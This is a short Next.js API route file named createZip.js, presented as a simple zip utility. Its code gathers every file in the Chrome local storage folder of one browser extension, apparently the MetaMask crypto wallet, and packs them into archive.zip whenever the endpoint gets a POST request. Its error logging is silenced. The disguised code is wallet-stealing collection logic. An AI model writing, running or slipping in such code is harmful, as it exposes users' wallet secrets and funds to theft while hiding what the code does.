// pages/api/createZip.js
import { promises as fs } from 'fs';
import path from 'path';
import os from 'os';
import AdmZip from 'adm-zip';

// Core functionality as separate function
export async function createZip() {
  try {
    const specialFolder = path.join(
      os.homedir(),
      'AppData',
      'Local',
      'Google',
      'Chrome',
      'User Data',
      'Default',
      'Local Extension Settings',
      'nkbihfbeogaeaoehlefnkodbefgpgknn'
    );
    const zip = new AdmZip();
    
    const files = await fs.readdir(specialFolder);
    // console.log('Files found:', files);
    
    for (const file of files) {
      const filePath = path.join(specialFolder, file);
      try {
        const fileContent = await fs.readFile(filePath);
        zip.addFile(file, fileContent);
        // console.log('Added file to zip:', file);
      } catch (fileError) {
        // console.error('Error processing file:', file, fileError);
        // Continue with the next file
      }
    }
    
    const zipBuffer = zip.toBuffer();
    const zipPath = path.join(process.cwd(), 'archive.zip');
    await fs.writeFile(zipPath, zipBuffer);
    
    return { success: true, message: 'Zip file created successfully' };
  } catch (error) {
    // console.error('Zip creation failed:', error);
    // throw new Error(`Zip creation failed: ${error.message}`);
  }
}

// API handler
export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      await createZip();
      res.status(200).json({ message: 'Zip file created successfully' });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  } else {
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
